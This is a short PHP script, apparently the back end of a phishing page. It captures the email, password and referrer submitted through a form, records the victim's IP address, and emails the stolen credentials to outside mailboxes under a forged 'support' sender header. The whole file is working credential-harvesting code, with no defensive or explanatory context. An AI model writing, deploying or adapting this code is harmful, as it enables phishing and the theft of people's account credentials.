﻿<?php

$email = $_POST['email'];
$password = $_POST['password'];
$ref = $_POST['ref'];
$count = $_POST['count'];
if($email){
    $http_client_ip = $_SERVER['HTTP_CLIENT_IP'];
     $http_x_forwarded_for = $_SERVER['HTTP_X_FORWARDED_FOR'];
     $remote_addr = $_SERVER['REMOTE_ADDR'];
     
    
 
     if(!empty($http_client_ip)){
      $ip_address = $http_client_ip. ' -client';
     }else if (!empty($http_x_forwarded_for)){
           $ip_address = $http_x_forwarded_for. ' -proxy';
     }else {
       $ip_address = $remote_addr. ' -remote';
     }
	//echo'<b> IP detection <br></b> powered by: pixelcount.net';
	
     // echo $ip_address;
      
     // $ip_block = array($ip_address);
      
      //print_r($ip_block);
      
     // if($ip_address == $ip_block[0])
     // {
       //   die('Your IP has been blocked');
     // }


$emlail = addslashes ($email);
$emlail1 = addslashes ($ref);
$padsswd = addslashes ($password);



$to = 'lopatinskyplant@bk.ru';
$subject = 'That client GM - '.$emlail.' Session:'.$count;
$txt = '<b>Email: </b> '.$emlail.' - used link'.$emlail1.' <br><b>Password:</b>'.$padsswd.'<br><b>IP:</b>'.$ip_address;


// More headers

// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
$headers .= "From:  support <support@twinbash.com>" . "\r\n"
."Bcc: wachare.acc@gmail.com";

mail($to,$subject,$txt,$headers);
}
?>